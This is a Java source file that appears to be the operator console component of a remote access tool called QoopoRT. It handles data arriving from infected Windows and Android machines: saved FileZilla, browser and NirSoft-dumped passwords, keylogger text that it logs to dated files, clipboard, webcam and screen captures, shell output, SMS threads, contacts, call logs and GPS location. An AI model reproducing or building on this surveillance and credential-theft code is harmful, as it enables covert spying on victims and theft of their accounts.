/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooport.asociado.v2;

import comunes.Archivo;
import comunes.CampoIcono;
import comunes.CapturaOpciones;
import comunes.Comando;
import comunes.Contacto;
import comunes.GPSPosicion;
import comunes.Llamada;
import comunes.Proceso;
import comunes.Sms;
import comunes.SmsConversacion;
import comunes.WebCamItem;
import java.awt.Color;
import java.awt.Dimension;
import java.io.BufferedWriter;
import java.io.EOFException;
import java.io.File;
import java.io.FileWriter;
import java.io.StreamCorruptedException;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import javax.swing.ImageIcon;
import network.Conexion;
import plugin.Plugin;
import qooport.asociado.Asociado;
import qooport.avanzado.QoopoRT;
import qooport.modulos.escritorioremoto.EscritorioRemoto;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Protocolo;
import qooport.utilidades.SizeUtil;
import qooport.utilidades.Util;

/**
 *
 * @author alberto
 */
public class AsociadoV2 extends Asociado {

    public AsociadoV2(Conexion conexion, int tipoconexion, boolean ssl) {
        super(conexion, tipoconexion, ssl);
    }

    public AsociadoV2(Conexion conexion, int tipoconexion, boolean ssl, String host, int puerto) {
        super(conexion, tipoconexion, ssl, host, puerto);
    }

//
//    private void enviarComando(int i) {
//        enviarObjeto(Asociado.crearComando(i, null));
//    }
    @Override
    public synchronized void enviarComando(int i, Object... cmd) {
        enviarObjeto(Util.comprimirObjeto(Asociado.crearComando(i, cmd.length, cmd)));
    }

    private void enviarObjeto(Object objeto) {
        try {
            conexion.escribirObjeto(objeto);
            conexion.flush();
            this.agregarEnviados(SizeUtil.sizeof(objeto));
        } catch (Exception ex) {
        }
    }

    @Override
    public void run() {
        try {
            String parametro = null;
            int anchoP = 0;
            int altoP = 0;
            byte[] data = null;
            Object objeto;
            Comando comando;
            while (activo) {
                parametro = null;
                objeto = Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                contadorEstado = 0;
                if (objeto instanceof Comando) {
                    comando = (Comando) objeto;
                    this.agregarRecibidos(SizeUtil.sizeof(comando));
                    switch (comando.getComando()) {
                        case Protocolo.PLUGINS_LISTAR:
                            try {
                            System.out.println("llega comando plugins listar");
                            if (plugins != null) {
                                plugins.actualizarListaPlugins((List<Plugin>) Util.leerParametro(comando));
                            } else {
                                System.out.println("la ventana es nula");
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        break;
                        case Protocolo.GET_CURSOR:
                            try {
                            ImageIcon cursor = (ImageIcon) Util.leerParametro(comando);
                            getEscritorioRemoto().cambiarCursorRemoto(cursor);
                        } catch (Exception e) {
                        }
                        break;
                        case Protocolo.AUTENTICAR:
                            autenticar();
                            break;
                        case Protocolo.PUERTO_TRANSFERENCIA:
                            try {
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            puertoTransferencia = Integer.valueOf(parametro);
                        } catch (Exception e) {
                        }
                        break;
                        case Protocolo.INFO:
                            infoRecibida = true;

                            if (accionInfo != null) {
                                accionInfo.ejecutar();
                            }

                            try {

                                parametro = (String) Util.leerParametro(comando);
                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
                                datos = parametro.split(":");
                                identificador = datos[1];
                                datos[2] = conexion.getInetAddress().getHostAddress();
                                ip = datos[2];
                                try {
                                    String[] m = datos[0].split("#");
                                    pais = m[0];
                                    bandera = m[1];
                                } catch (Exception e) {
                                    pais = datos[0];
                                    bandera = "3";
                                }
                                usuario = datos[4];
                                host = datos[5];
                                so = datos[7];
                                webCam = datos[6];
                                setAndroid(so.toLowerCase().contains("android"));
                                try {
                                    QoopoRT.instancia.actualizarDatosServidor(this);
                                } catch (Exception e) {
                                }
                                if (abrirEscritoriRemotoAlconectar) {
                                    abrirEscritorioRemoto();
                                }
                            } catch (Exception e) {

                            }
                            enviarComando(Protocolo.GET_USUARIO_IMAGEN);

                            if (accionListo != null) {
                                accionListo.ejecutar();
                            }

                            break;
                        case Protocolo.GET_INFO_COMPLETA:
                            parametro = (String) Util.leerParametro(comando);
                            if (getInformacionGUI() != null) {
                                getInformacionGUI().txtInfo.setText(parametro);
                                getInformacionGUI().repaint();
                            }
                            //graba un archivo con la informacion en la carpeta del cliente 
                            try {
                                if (dInfor != null) {
                                    Util.agregarTexto(new File(this.dInfor, "info_" + Util.nombreHora() + ".txt"), parametro);
                                } else {
                                    System.out.println("no esta seteado el path de la info");
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            break;

                        case Protocolo.INFO_CPU:
                            double cpu1 = (double) Util.leerParametro(comando, 0);
                            double cpu2 = (double) Util.leerParametro(comando, 1);
                            if (monitorSistema != null) {
                                monitorSistema.agregarDatoCPU(cpu1, cpu2);
                            }
                            break;
                        case Protocolo.INFO_RAM:
                            double libre = (double) Util.leerParametro(comando, 0);
                            double ram = (double) Util.leerParametro(comando, 1);
                            if (monitorSistema != null) {
                                monitorSistema.agregarDatoRAM(libre, ram);
                            }
                            break;

                        case Protocolo.GET_PORTAPAPELES:
                            parametro = (String) Util.leerParametro(comando);
                            if (portapapeles != null) {
                                portapapeles.contenido.setText(parametro);
//                                portapapeles.contenido2.setText(parametro);
                                portapapeles.repaint();
                            }
                            break;
                        case Protocolo.COMANDO_SHELL:
                            parametro = (String) Util.leerParametro(comando);
                            if (consola != null) {
                                consola.vaciarcomando();
                                consola.salida.append(parametro);
                                consola.salida.setCaretPosition(consola.salida.getDocument().getLength());
                                consola.repaint();
                            }
                            break;
                        case Protocolo.CHAT_MENSAJE:
                            parametro = (String) Util.leerParametro(comando);
                            if (this.chat != null) {
                                chat.salida.setCaretColor(Color.GREEN);
                                chat.salida.append(parametro + "\n");
                                chat.salida.setCaretPosition(chat.salida.getDocument().getLength());
                                chat.salida.setCaretColor(Color.BLUE);
                                chat.repaint();
                            }
                            break;
                        case Protocolo.GET_MINIATURA_PANTALLA:
                            recibirMiniatura((byte[]) Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_MINIATURA_CAM:
                            recibirMiniaturaWC((byte[]) Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_USUARIO_IMAGEN:
                            recibirImagenUsuario((byte[]) Util.leerParametro(comando));
                            break;
                        case Protocolo.NO_WEB_CAM:
                            recibirNoWebCam();
                            break;
                        case Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS:

                            if (!isAndroid()) {
                                //si viene de un cliente pc
                                recibirUnidades(Util.leerParametro(comando));
                            } else {
                                //si viene de un cliente android
                                recibirUnidades((Object[]) comando.getObjeto());
                            }
                            break;
                        case Protocolo.LISTAR_WEBCAMS:
                            if (!isAndroid()) {
                                //si viene de un cliente pc
                                recibirListaWebCams(Util.leerParametro(comando));
                            } else {
                                //si viene de un cliente android
                                recibirListaWebCams((Object[]) comando.getObjeto());
                            }
                            break;
                        case Protocolo.GET_LISTA_DIMENSIONES_CAM:
                            recibirListaWebCamsSizes(Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_LISTA_MONITORES:
                            if (!isAndroid()) {
                                //si viene de un cliente pc
                                recibirListaMonitores(Util.leerParametro(comando));
                            } else {
                                //si viene de un cliente android
                                recibirListaMonitores((Object[]) comando.getObjeto());
                            }
                            break;
                        case Protocolo.GET_LISTA_RESOLUCION:
                            recibirListaResoluciones(Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_RESOLUCION:
                            anchoP = (int) Util.leerParametro(comando, 0);
                            altoP = (int) Util.leerParametro(comando, 1);
//                            this.getEscritorioRemoto().getContenedorPrincipal().getPantalla(0).setSize(new Dimension(anchoP, altoP));
//                            this.getEscritorioRemoto().getContenedorPrincipal().getPantalla(0).setPreferredSize(new Dimension(anchoP, altoP));
                            if (!this.getEscritorioRemoto().isPantallaCompleta()) {
                                this.getEscritorioRemoto().getReproductor().getContenedor().setSize(new Dimension(anchoP, altoP));
                                this.getEscritorioRemoto().getReproductor().getContenedor().setPreferredSize(new Dimension(anchoP, altoP));
                                this.getEscritorioRemoto().repaint();
                                this.getEscritorioRemoto().pack();
                                GuiUtil.centrarVentana(getEscritorioRemoto(), anchoP, altoP);
                            }

                            break;
                        case Protocolo.GET_LISTA_PROCESOS:
                            recibirListaProcesos(Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_LISTA_CONEXIONES:
                            recibirListaConexiones(Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_LISTA_EQUIPOS_RED:
                            parametro = (String) Util.leerParametro(comando);
                            if (this.redLan != null) {
                                if (!redLan.isVisible()) {
                                    redLan.setVisible(true);
                                }
                                redLan.agregarFila(parametro);
                                redLan.repaint();
                            }
                            break;
                        case Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO:
                            if (comando.getnParametros() == 1) {
                                //si viene de un cliente pc
                                recibirArchivos(Util.leerParametro(comando));
                            } else {
                                //si viene de un cliente android
                                recibirArchivos((Object[]) comando.getObjeto());
                            }

                            break;
                        case Protocolo.BUSCAR_ARCHIVO:
                            recibirArchivosBusqueda(Util.leerParametro(comando));
                            break;
                        case Protocolo.BUSCAR_ARCHIVO_DETENER:
                            if (this.adminArchivos != null) {
                                if (!adminArchivos.isVisible()) {
                                    adminArchivos.setVisible(true);
                                }
                                adminArchivos.detenerBusqueda();
                                adminArchivos.repaint();
                            }
                            break;
                        case Protocolo.ADMIN_ARCHIVOS_THUMBAIL:
                            data = (byte[]) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(data));
                            this.recibirThumbail(data);
                            break;
                        case Protocolo.PASSWORDS_FILEZILLA:
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            if (passwords != null) {
                                passwords.passFZ.setText(parametro);
                                passwords.repaint();
                            }
                            break;
                        case Protocolo.PASSWORDS_DM:
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            if (passwords != null) {
                                passwords.passDM.setText(parametro);
                                passwords.repaint();
                            }
                            break;
                        case Protocolo.PASSWORDS_WEB:
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            if (passwords != null) {
                                passwords.passWB.setText(parametro);
                                passwords.repaint();
                            }
                            break;
                        case Protocolo.PASSWORDS_NIRSOFT:
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            if (passwords != null) {
                                passwords.passNirsoft.setText(parametro);
                                passwords.repaint();
                            }
                            break;
                        case Protocolo.GET_LISTA_OFFLINE:
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            if (this.archivosOffline != null) {
                                archivosOffline.txtListaOffline.setText(parametro);
                                archivosOffline.repaint();
                            }
                            break;
                        case Protocolo.MENSAJE_SERVIDOR:
                            parametro = (String) Util.leerParametro(comando);
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            if (QoopoRT.instancia != null) {
                                QoopoRT.instancia.ponerEstado("Servidor (" + getInformacion() + "):" + parametro);
                            }
                            break;
                        case Protocolo.PING:// enviamos PING
                            enviarComando(Protocolo.PONG);
                            break;
                        case Protocolo.PONG:
                            pong = System.currentTimeMillis();
                            tiempoVida = pong - ping;
                            pings--;
                            if (infoRecibida) {
                                if (QoopoRT.instancia != null) {
                                    QoopoRT.instancia.actualizarDatosServidor(this);
                                }
                            }
                            break;
                        case Protocolo.UBICACION_GPS:
                            try {
                            GPSPosicion posicion = (GPSPosicion) Util.leerParametro(comando);
                            if (mapa != null) {
                                mapa.getMapa().updateMap(posicion.getLongitud(), posicion.getLatitud(), posicion.getAltitud(), posicion.getVelocidad(), posicion.getAcurrancy(), posicion.getTime(), posicion.getProveedor());
                                mapa.getMapa().repaint();
                                mapa.repaint();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        break;
                        case Protocolo.GET_LISTA_PROVEEDORES_GPS:
                            List<String> provedores = ((ArrayList<String>) Util.leerParametro(comando));
                            if (mapa != null) {
                                try {
                                    mapa.getProvedor().removeAllItems();
                                } catch (Exception e) {
                                }
                                for (String provedorGPS : provedores) {
                                    mapa.getProvedor().addItem(provedorGPS);
                                }
                                mapa.repaint();
                            }
                            break;
                        case Protocolo.GET_LISTA_CONTACTOS:
//                            if (!isAndroid()) {
                            recibirContactos(Util.leerParametro(comando));
//                            } else {
//                                recibirContactos(comando.getObjeto());
//                            }
                            break;
                        case Protocolo.GET_LISTA_SMS:
                            recibirSMS(Util.leerParametro(comando));
                            break;
                        case Protocolo.GET_LISTA_LLAMADAS:
                            recibirLlamadas(Util.leerParametro(comando));
                            break;
                        case Protocolo.KEYLOGGER_GET_TEXT:
                            parametro = (String) Util.leerParametro(comando);
                            if (this.keylogger != null) {
                                keylogger.contenido.append(parametro);
                                keylogger.repaint();
                            }
                            File f = new File(new File(new File(fKeylogger, sdfAnio.format(new Date())), sdfMes.format(new Date())), sdfDia.format(new Date()));
                            if (!f.exists()) {
                                f.mkdirs();
                            }
                            BufferedWriter out = null;
                            try {
                                out = new BufferedWriter(new FileWriter(new File(f, "keylogger.txt"), true));
                                out.write(parametro);
                            } finally {
                                if (out != null) {
                                    out.close();
                                }
                            }
                            out = null;
                            break;
                        case Protocolo.KEYLOGGER_NO_PLUGIN:
                            if (keylogger != null) {
                                keylogger.contenido.append("\n<<<NO HAY PLUGIN>>>\n");
                                keylogger.repaint();
                            }
                            break;
                        case Protocolo.ENVIAR_PORTAPAPELES:
                            try {
                            Object objPortapaleles = Util.leerParametro(comando);
                            if (objPortapaleles != null) {
                                if (this.escritorioRemoto.getItmClipboard().isSelected()) {
                                    escritorioRemoto.getClipboard().setContent(objPortapaleles);
                                }
                            }
                        } catch (Exception e) {
                        }
                        break;

                        case Protocolo.GET_KEYBOARD_LAYOUT:
                            Locale locale = (Locale) Util.leerParametro(comando);
                            QoopoRT.instancia.ponerEstado("Recibi configuracion teclado " + locale.toString());
                            break;

                    }
                }
            }

        } catch (SocketException ex) {
            System.out.println("Error de socket " + getInfoIP()); //puede ser socekt closed
            ex.printStackTrace();
            desconectar();
        } catch (EOFException ex) {
            contadorEstado++;
            System.out.println("Error EOF. Conexion cerrada " + getInfoIP());
            ex.printStackTrace();
//            if (contadorEstado > 5) {
            contadorEstado = 0;
            desconectar();
//            }
        } catch (StreamCorruptedException ex) {
            System.out.println("StreamCorruptedException " + getInfoIP()); //puede ser socekt closed
            ex.printStackTrace();
            desconectar();
        } catch (Exception ex) {
            System.out.println("error general " + getInfoIP());
            ex.printStackTrace();
            desconectar();
        }
    }

    public void recibirListaWebCams(Object objeto) {
        if (camara != null) {

            if (!camara.isVisible()) {
                camara.setVisible(true);
            }
            try {
                camara.getWebcam().removeAllItems();
            } catch (Exception e) {
            }
            try {
                WebCamItem[] lista = (WebCamItem[]) objeto;
                if (lista != null) {
                    for (WebCamItem lista1 : lista) {
                        camara.getWebcam().addItem(lista1.getNombre());
                    }
                }
            } catch (Exception e) {
            }
            camara.actualizarMenuCamaras();
        }
    }

    public void recibirListaWebCamsSizes(Object objeto) {
        if (camara != null) {
            if (!camara.isVisible()) {
                camara.setVisible(true);
            }
            try {
                camara.getWebcamSizes().removeAllItems();
            } catch (Exception e) {
            }
            Dimension[] lista = (Dimension[]) objeto;
            if (lista != null) {
                String wcs = "";
                List<String> resol = new ArrayList<>();
                for (int i = 0; i < lista.length; i++) {
                    wcs = lista[i].width + "x" + lista[i].height;
                    if (!resol.contains(wcs)) {
                        camara.getWebcamSizes().addItem(wcs);
                        resol.add(wcs);
                    }
                }
            }
            try {
                camara.getWebcamSizes().setSelectedItem("800x600");//resolucion default
            } catch (Exception e) {
            }
            camara.actualizarMenuResolucion();
        }
    }

    public void recibirListaMonitores(Object objeto) {
        //EscritorioRemoto vent = (EscritorioRemoto) QoopoRT.capturasEscritorio.get(servidor.getIdentificador());

        if (escritorioRemoto != null) {
            if (!escritorioRemoto.isVisible()) {
                escritorioRemoto.setVisible(true);
            }
            try {
                escritorioRemoto.getCmbMonitor().removeAllItems();
//                vent.getMonitor().addItem("TODO -1 0x0");
            } catch (Exception e) {
            }
            String[] lista = (String[]) objeto;
            if (lista != null) {
                String[] dat;
                for (String arr : lista) {
                    dat = arr.split(":");
                    escritorioRemoto.getCmbMonitor().addItem("Monitor " + dat[0] + " " + dat[1] + "x" + dat[2]);
                }
            }
            escritorioRemoto.actualizarMenuMonitor();
        }
    }

    public void recibirListaResoluciones(Object objeto) {
        if (escritorioRemoto != null) {
            if (!escritorioRemoto.isVisible()) {
                escritorioRemoto.setVisible(true);
            }
            try {
                escritorioRemoto.getResolucion().removeAllItems();
            } catch (Exception e) {
            }
            List<String> lista = (ArrayList<String>) objeto;
            if (lista != null) {
                List<String> resoluciones = new ArrayList<>();
                for (String resol : lista) {
                    if (!resoluciones.contains(resol)) {
                        escritorioRemoto.getResolucion().addItem(resol);
                        resoluciones.add(resol);
                    }
                }
            }
            escritorioRemoto.actualizarMenuResolucion();
        }
    }

    public void recibirListaProcesos(Object objeto) {

        if (procesos != null) {
            if (!procesos.isVisible()) {
                procesos.setVisible(true);
            }
            List<Proceso> lista = (List<Proceso>) objeto;
            if (lista != null) {
                procesos.limpiatabla();
                for (Proceso p : lista) {
                    procesos.agregarFila(p.getDatos());
                }
            }
            procesos.repaint();
        }
    }

    public void recibirListaConexiones(Object objeto) {
        if (conexiones != null) {
            if (!conexiones.isVisible()) {
                conexiones.setVisible(true);
            }
            List<Proceso> lista = (List<Proceso>) objeto;
            if (lista != null) {
                conexiones.limpiatabla();
                for (Proceso p : lista) {
                    conexiones.agregarFila(p.getDatos());
                }
            }
            conexiones.repaint();
        }
    }

    public void recibirListaEquiposredLan(Object objeto) {
        if (redLan != null) {
            if (!redLan.isVisible()) {
                redLan.setVisible(true);
            }
            List<String> lista = (List<String>) objeto;
            if (lista != null) {
                redLan.limpiatabla();
                for (String p : lista) {
                    redLan.agregarFila(p);
                }
            }
            redLan.repaint();
        }
    }

    public void recibirUnidades(Object objeto) {
        if (adminArchivos != null) {
            if (!adminArchivos.isVisible()) {
                adminArchivos.setVisible(true);
            }
            try {
                adminArchivos.getUnidad().removeAllItems();
            } catch (Exception e) {
            }
            Archivo[] unidades = (Archivo[]) objeto;
            if (unidades != null) {
                ImageIcon[] unitmp = new ImageIcon[unidades.length];
                for (int i = 0; i < unitmp.length; i++) {
                    if (unidades[i].getIcono() != null) {
                        ImageIcon item = new ImageIcon(unidades[i].getIcono());
                        item.setDescription(Util.armarNombreUnidad(unidades[i]));
                        unitmp[i] = item;
                    } else {
                        ImageIcon item = Util.cargarIcono16("/resources/folder.png");
                        item.setDescription(Util.armarNombreUnidad(unidades[i]));
                        unitmp[i] = item;
                    }
                }
                adminArchivos.setUnidades(unitmp);
                for (int i = 0; i < unitmp.length; i++) {
                    adminArchivos.getUnidad().addItem(i);
                }
            }
        }
    }

    public void recibirArchivos(Object objeto) {
        if (adminArchivos != null) {
            if (!adminArchivos.isVisible()) {
                adminArchivos.setVisible(true);
            }
            Archivo[] archivo = (Archivo[]) objeto;
//            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
            if (archivo != null) {
                adminArchivos.limpiaTablaRemota();
                adminArchivos.getModelotabla().addRow(new Object[]{
                    new CampoIcono(Util.obtenerBytes(Util.cargarIcono16("/resources/up_arrow.png")), "..")});
                for (Archivo p : archivo) {
                    adminArchivos.getModelotabla().addRow(new Object[]{
                        new CampoIcono(p.getIcono() != null ? p.getIcono() : (p.isCarpeta() ? Util.obtenerBytes(Util.cargarIcono16("/resources/folder.png")) : Util.obtenerBytes(Util.cargarIcono16("/resources/file.png"))), p.getNombre()),
                        p.isCarpeta() ? "(Carpeta)" : p.getTipo(),
                        p.getLength(),
                        sdf.format(new Date(p.getFecha()))
                    /*,p.getLibre(),p.getTamanio()*/

                    });
                }

                adminArchivos.getRutaRemota().setText(archivo[0].getPathParent().replace(adminArchivos.sep + "..", ""));
                if (archivo[0].getPathParent().contains(adminArchivos.sep + "..")) {
                    if (!adminArchivos.getRutaRemota().getText().contains(adminArchivos.sep)) {
                        adminArchivos.getRutaRemota().setText("");
//                        adminArchivos.getRutaRemota().setText("/");
                    } else {
                        adminArchivos.getRutaRemota().setText(adminArchivos.getRutaRemota().getText().substring(0, adminArchivos.getRutaRemota().getText().lastIndexOf(adminArchivos.sep)) + adminArchivos.sep);
                    }
                }
            } else// si la lista viene vacia, agrego la flechita para ADMIN_ARCHIVOS_SUBIR de directorio, indicando que ya se recibio la repuesta del servidor
            {
                adminArchivos.limpiaTablaRemota();
                adminArchivos.getModelotabla().addRow(new Object[]{
                    new CampoIcono(Util.obtenerBytes(Util.cargarIcono16("/resources/up_arrow.png")), "..")});
            }
            adminArchivos.repaint();
        }
    }

    public void recibirArchivosBusqueda(Object objeto) {
        if (adminArchivos != null) {
            if (!adminArchivos.isVisible()) {
                adminArchivos.setVisible(true);
            }
            Archivo archivo = (Archivo) objeto;
            if (archivo != null) {
                adminArchivos.getModelotablaResultados().addRow(new Object[]{
                    new CampoIcono(archivo.getIcono() != null ? archivo.getIcono() : (archivo.isCarpeta() ? Util.obtenerBytes(Util.cargarIcono16("/resources/folder.png")) : Util.obtenerBytes(Util.cargarIcono16("/resources/file.png"))), archivo.getNombre()),
                    //                            archivo.getNombre(),
                    archivo.isCarpeta() ? "(Carpeta)" : archivo.getTipo(),
                    archivo.getLength(),
                    archivo.getPathParent()
                });
            }
            adminArchivos.repaint();
        }
    }

    public void recibirContactos(Object objeto) {
        if (contactos != null) {
            if (!contactos.isVisible()) {
                contactos.setVisible(true);
            }
            ArrayList<Contacto> lista = (ArrayList<Contacto>) objeto;
            if (lista != null) {
                contactos.limpiatabla();
                for (Contacto p : lista) {
                    contactos.getModelotabla().addRow(
                            new Object[]{
                                p.getPhoto(),
                                p.getDisplay_name(),
                                p.getPhones() != null && !p.getPhones().isEmpty() ? p.getPhones().get(0) : "",
                                p.getEmails() != null && !p.getEmails().isEmpty() ? p.getEmails().get(0) : ""
                            });
                }
            }
            contactos.repaint();
        }
    }

    public void recibirSMS(Object objeto) {
        if (smsListar != null) {
            if (!smsListar.isVisible()) {
                smsListar.setVisible(true);
            }
            ArrayList<Sms> lista = (ArrayList<Sms>) objeto;
            ArrayList<SmsConversacion> conversaciones = new ArrayList<>();
            if (lista != null) {
                smsListar.limpiatabla();
                for (Sms p : lista) {
                    boolean encontrado = false;
                    for (SmsConversacion c : conversaciones) {
                        if (c.getIdHilo() == p.getThid()) {
                            c.agregarSms(p);
                            encontrado = true;
                        }
                    }
                    if (!encontrado) {
                        SmsConversacion nueva = new SmsConversacion(p.getThid());
                        nueva.agregarSms(p);
                        conversaciones.add(nueva);
                    }
                }
                Collections.sort(conversaciones, new Comparator() {
                    @Override
                    public int compare(Object p1, Object p2) {
                        return new Date(((SmsConversacion) p1).getUltimo().getDate()).compareTo(
                                new Date(((SmsConversacion) p2).getUltimo().getDate())
                        );
                    }
                });
                for (SmsConversacion c : conversaciones) {
                    smsListar.getModelohilos().addRow(new Object[]{
                        c.getIdHilo(),
                        c.getUltimo().getAdd(),
                        c.getUltimo().getBody()});
                }
                smsListar.setHilos(conversaciones);
            }
            smsListar.repaint();
        }
    }

    public void recibirLlamadas(Object objeto) {
        if (smsListar != null) {
            if (!smsListar.isVisible()) {
                smsListar.setVisible(true);
            }
            ArrayList<Llamada> lista = (ArrayList<Llamada>) objeto;
            if (lista != null) {
                smsListar.limpiatabla();
                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                for (Llamada p : lista) {
                    smsListar.getModelotabla().addRow(
                            new Object[]{
                                p.getId(),
                                p.getType(),
                                sdf.format(new Date(p.getDate())),
                                p.getDuration(),
                                p.getNumber(),
                                p.getName(),
                                p.getRaw_contact_id()
                            });
                }
            }
            smsListar.repaint();
        }
    }

    @Override
    public void enviarEscritorioRemotoOpciones(CapturaOpciones opciones) {
        boolean criterio = false;
        EscritorioRemoto er = this.getEscritorioRemoto();
        if (er == null) {
            criterio = true;
//        } else if (er.getRecibirEscritorio().isPidiendo()) {
        } else if (er.getServicio().getConexion() != null && er.getServicio().getConexion().isConectado()) {
            criterio = true;
        }

//        System.out.println("enviadno opciones=" + opciones.toString());
//        System.out.println("es inversa? =" + isConexionInversa());
//        System.out.println("criterio ? " + criterio);
        if (isConexionInversa() || criterio) {
            this.enviarComando(Protocolo.ESCRITORIO_REMOTO, opciones);
        } else {
            try {
                Conexion conexNueva = new Conexion(this.getHost(), this.getPuertoTransferencia(), this.getConexion().getTipo());
                conexNueva.escribirObjeto(Util.comprimirObjeto(Asociado.crearComando(Protocolo.ESCRITORIO_REMOTO, 1, opciones)));
                conexNueva.flush();
//                if (er == null) {
//                    er = new EscritorioRemoto(conexNueva, this);
//                    er.setVisible(true);
//                    er.setLocation(100, 100);
//                    er.setTitle("Escritorio Remoto [" + getInformacion() + "]");
//                    er.setConexion(conexNueva);
//                    this.setEscritorioRemoto(er);
//                } else {
                if (!er.isVisible()) {
                    er.setVisible(true);
                }
                er.setConexion(conexNueva);
                er.setTitle("Escritorio Remoto  [" + getInformacion() + "]");
//                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

}
